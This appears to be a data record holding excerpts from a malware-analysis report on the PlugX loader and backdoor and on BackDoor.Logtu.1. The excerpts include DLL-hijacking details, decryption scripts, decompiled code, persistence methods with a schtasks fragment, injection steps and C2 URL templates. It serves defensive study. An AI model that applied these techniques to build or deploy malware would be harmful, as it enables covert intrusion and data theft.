it, which are the port number;\n\no Connects to the same server through the received port;\n\no Connects to the second server, specified in the incoming arguments;\n\no Forward the traffic between previously established connections.\n\n\u00b7 0x606:\n\nStops proxy server operation.\n\nBackDoor.PlugX.27\n\nA loader for BackDoor.PlugX.28 written in C. It is a malicious library that functions within the\nprocess of a valid executable file. This library unpacks and executes the shellcode with\npayload. The trojan utilizes DLL hijacking to load the malicious code into a process. \n\nThe loader\u2019s components and the attacked applications:\n\nExecutable\u2019s SHA-1\nhash\n\nEXE\n\nDLL\n\nShellcode\n\n5c51a20513ba27325\n113d463be9b5c6ed4\n0b5096\n\nEMLPRO.EXE\n\nscansts.dll\n\nQuickHeal\n\n\fExecutable\u2019s SHA-1\nhash\n\nEXE\n\nDLL\n\nShellcode\n\n76\n\n76\n\nCLNTCON.exe\n\nCLNTCON.ocx\n\nCLNTCON.ocp\n\nEHSrv.exe\n\nhttp_dll.dll\n\nESETSrv\n\nb423bea76f996bf2f\n69dcc9e75097635d7\nb7a7aa\n\n5d076537f56ee7389\n410698d700cc4fd7d\n736453\n\nOperating routine\n\nscansts.dll\n\nOnce loaded to a process, the library transfers control to the call of scansts_2 the\nexported function by a hardcoded offset.\n\nIn that function the library refers to QuickHeal file, which is located at C:\n\\Windows\\System32 on the infected system. It then checks for the\nHKLM\\Software\\BINARY or HKCU\\Software\\BINARY registry key to determine further\nactions. If the registry keys are absent, the trojan initiates decryption of the QuickHeal\nshellcode and then calls it by passing it as an argument 0.\n\nDecryption algorithm:\n\ns = ''\nfor i in range(len(d)):\n    s += chr((((ord(d[i]) + 0x4f) ^ 0xf1) - 0x4f) & 0xff)\n\nCLNTCON.ocx\n\nIt is the improved version of scansts.dll. The main malicious code is located in the\nDllRegisterServer exported function. The function call decrypts the DLL\u2019s code using an\nalgorithm based on the XOR operation. The trojan then refers to CLNTCON.ocp and checks\nfor the HKLM\\Software\\BINARY or HKCU\\Software\\BINARY registry keys. The\nshellcode is decrypted in two stages: in addition to the mentioned algorithm, the RC4\nalgorithm with the CLNTCON.ocp decoding key is also used.\n\nhttp_dll.dll\n\nIt is equivalent to CLNCON.ocx except the following options:\n\n\u00b7 the main trojan\u2019s code is located in the StartHttpServer exported function,\n\n\f77\n\n77\n\n\u00b7 ESETSrv is used as the RC4 decoding key.\n\nQuickHeal shellcode\n\nIt is the obfuscated shellcode with an encrypted binary file and configuration. The\nobfuscated portion contains decryption instructions for the code that extracts the payload. \n\nThe payload is extracted by malmain function and defined by the following structure:\n\n#pragma pack(push,1)\nstruct st_data\n{\n  _DWORD size;\n  _BYTE data[size];\n\n\f78\n\n78\n\n};\n\nstruct shellarg\n{\n  _DWORD shellcode_ep;\n  _DWORD field_4;\n  st_data* mod;\n  _DWORD comp_size;\n  st_data* cfg;\n  _DWORD field_14;\n  _DWORD field_18;\n};\n#pragma pack(pop) \n\nRtlDecompressBuffer function is used for decompression. During the payload extraction\nprocess the shellcode verifies executable\u2019s signatures. MZ and PE signatures are replaced\nwith XV. Then DllMain is being executed. It receives the pointer to shellarg structure as a\nlpReserved parameter. This structure contains payload\u2019s configuration.\n\nBackDoor.PlugX.28\n\nIt is a multi-module backdoor written in C++ and designed to operate in 64-bit Microsoft\nWindows operating systems. Once installed by the loader, it operates in an infected\ncomputer\u2019s RAM. It is used in targeted attacks on information systems for gaining\nunauthorized access to the data and for transferring it to C&C servers. Its key feature is\nutilizing plug-ins that contain the main backdoor\u2019s functionality. \n\nOperating routine\n\nThe trojan is loaded by BackDoor.PlugX.27. Calling conventions vary from function to\nfunction and are often non-standard: arguments are passed through arbitrary registers and /\nor via the stack, which may indicate the malicious program was compiled with an\noptimization. \n\nNumerous objects are defined and used for the trojan\u2019s operation. Abstract objects\nimplement the data transmission interface and are used for data transferring. Thus, the\nfunction is not bound to the internal implementation of the connection object, whether it is\na TCP socket, RAW socket, HTTP connection, or pipe. Object class can be determined in the\ncode, as well as defined by the server type in the configuration or by data received from\nknown servers.\n\nAlmost all strings of the trojan\u2019s code are encrypted. Decryption algorithm:\n\nimport idaapi\nimport struct\n\ndef dec(d):\n    s = ''\n    k = struct.unpack('<I', d[:4])[0]\n\n \n \n\f79\n\n79\n\n    d = d[4:]\n    a = k ^ 0x13377BA\n    b = k ^ 0x1B1\n    for i in range(len(d)):\n        a = (a + 4337) & 0xffffffff\n        b = (b - 28867) & 0xffffffff\n\n        a0 = (a & 0x000000ff)\n        a1 = (a & 0x0000ff00) >> 8\n        a2 = (a & 0x00ff0000) >> 16\n        a3 = (a & 0xff000000) >> 24\n        b0 = (b & 0x000000ff)\n        b1 = (b & 0x0000ff00) >> 8\n        b2 = (b & 0x00ff0000) >> 16\n        b3 = (b & 0xff000000) >> 24       \n\n        s += chr(ord(d[i]) ^ (((b2 ^ (((b0 ^ (((a2 ^ ((a0 - a1)&0xff)) - a3)\n&0xff)) - b1)&0xff)) - b3) & 0xff))\n\n    return s\n\ndef decrypt(addr, size):\n    d = ''\n    for i in range(size):\n        d += chr(idaapi.get_byte(addr + i))\n\n    s = dec(d)\n    print s\n\n    for i in range(len(s)):\n        idaapi.patch_byte(addr + i, ord(s[i]))\n    idaapi.patch_dword(addr + i + 1, 0)\n\nPreparing procedures\n\nBackDoor.PlugX.28 can obtain configuration by several ways. The loader passes the\nargument that is the pointer to the shellarg structure:\n\n#pragma pack(push,1)\nstruct st_data\n{\n  _DWORD size;\n  _BYTE *data;\n};\n\nstruct shellarg\n{\n  _DWORD shellcode_ep;\n  _DWORD field_4;\n  st_data* mod;\n  _DWORD comp_size;\n  st_data* cfg;\n  _DWORD field_14;\n  _DWORD op_mode;\n};\n\n         \n                         \n         \n     \n     \n     \n  \n\f80\n\n80\n\n#pragma pack(pop)\n\nThe trojan then checks the value pointed to by shellarg->cfg. If the first 8 bytes at this\naddress equal XXXXXXXX, the backdoor prepares the so- called basic configuration, which is\nused by default; otherwise, the backdoor uses a decrypted and decompressed configuration,\nwhich is received from the loader.\n\nThis second option also involves checking the availability of the configuration file stored in\nthe trojan\u2019s working directory. The configuration\u2019s filename, like many other filenames, is\ngenerated by the following algorithm:\n\nint __usercall gen_string@<eax>(DWORD seed@<eax>, s *result, LPCWSTR base)\n{\n  DWORD v3; // edi\n  DWORD v4; // eax\n  signed int v5; // ecx\n  signed int i; // edi\n  DWORD v7; // eax\n  WCHAR Buffer; // [esp+10h] [ebp-250h]\n  __int16 v10; // [esp+16h] [ebp-24Ah]\n  __int16 name[34]; // [esp+210h] [ebp-50h]\n  DWORD FileSystemFlags; // [esp+254h] [ebp-Ch]\n  DWORD MaximumComponentLength; // [esp+258h] [ebp-8h]\n  DWORD serial; // [esp+25Ch] [ebp-4h]\n  v3 = a1;\n  GetSystemDirectoryW(&Buffer, 0x200u);\n  v10 = 0;\n  if ( GetVolumeInformationW(\n         &Buffer,\n         &Buffer,\n         0x200u,\n         &serial,\n         &MaximumComponentLength,\n         &FileSystemFlags,\n         &Buffer,\n         0x200u) )\n  {\n    v4 = 0;\n  }\n  else\n  {\n    v4 = GetLastError();\n  }\n  if ( v4 )\n    serial = v3;\n  else\n    serial ^= v3;\n  v5 = (serial & 0xF) + 3;\n  for ( i = 0; i < v5; serial = 8 * (v7 - (serial >> 3) + 20140121) - ((v7 - (serial\n>> 3) + 20140121) >> 7) - 20140121 )\n  {\n    v7 = serial << 7;\n    name[i++] = serial % 0x1A + 'a';\n  }\n  name[v5] = 0;\n  string::wcopy(a2, base);\n\n\f81\n\n81\n\n  string::wconcat(a2, (LPCWSTR)name);\n  return 0;\n}\n\nThe seed value for the configuration\u2019s filename is 0x4358 (", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run;\n\u00b7 2 \u2014 creates tasks in Task Scheduler;\n\u00b7 3 \u2014 sets services (if there are no administrative privileges, it is equivalent to 1 mode).\n\nIf executed without achieving persistence, the trojan checks the config.inject_flag\nflag. If the value is not equal to 0, the argument passed from the loader is checked. If the\nargument contains the PLUG value, the process specified in\nconfig.inject_target_proc is started. The shellcode from the shellarg structure is\ninjected into this process and the main process is terminated.\n\nIn case of execution with persistence, the trojan checks the current directory. If it matches the\ntrojan\u2019s working directory config.homedir, the persistence stage is skipped and either the\nprocess injection or the main functionality is performed. Otherwise, 2 mutexes are created\nwith the Global\\DelSelf(XXXXXXXX) and Global\\DelSelf(YYYYYYYYY) names,\nwhere XXXXXXXX and YYYYYYY are IDs of the current and parent processes in the HEX view,\nrespectively. In all persistence modes, the trojan moves its files to the working directory.\n\nThe persistence provides an option when the config.persist_mode parameter can take\nthe 0 value. This is necessary if the process is started with 3 arguments and the second\nargument equals 100. In such conditions, after transferring its files, BackDoor.PlugX.38 is\nrestarted from its working directory. \n\nIn the persistence option with the value config.persist_mode == 1, the autorun key\ncreates a parameter with the name specified in the config.persist_name configuration.\nAfter that, the trojan launches itself from the working directory. \n\nIf the persistence option is set to config.persist_mode == 2, a task is created in the\nscheduler by calling schtasks:\n\ncmd.exe /c schtasks /create /sc minute /mo 2 /tn  ", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ProxyServer] registry key and tries to establish the connection. In case of\nanother failure, the backdoor tries to obtain the proxy server information through the\nWinHTTP API, sending the google[.]com request via the WinHttpGetProxyForUrl\nfunction. If this attempt has also failed, BackDoor.Logtu.1 tries to extract the corresponding\nsettings from the HKU\\<session_user_SID>\\...\\ProxyServer registry key. This cycle\nrepeats until the trojan is successfully connected to the server.\n\nAfter successfully connecting, BackDoor.Logtu.1 sends the information about the infected\nsystem to the server. The data transfer and response receipt is divided into two stages:\n\n1. Sending the packet with the length of the payload,\n\n2. Sending the payload itself.\n\nThe value of the packet with the length of 4 bytes equals <payload_len>+4. This is\nbecause the packet with the payload contains a 4 bytes prefix, which in turn, contains the\npayload ID. Consequently, the payload has the format as shown below:\n\nstruct payload\n{\nDWORD payload_id;\nBYTE payload[payload_len];\n}\n\nThe data transferred from the trojan to the server, as well as its response, are encrypted with\nthe RC4 algorithm. The encryption key is stored inside the trojan body as a separate string,\nbut calculates using the following algorithm: \n\nfrom hashlib import md5\npassword = "], "URLs": ["http://<cnc_addr>:<cnc_port>/result?hl=en&id=<id>", "http://%s/updates.php?0x%08x"], "weight": 0.0}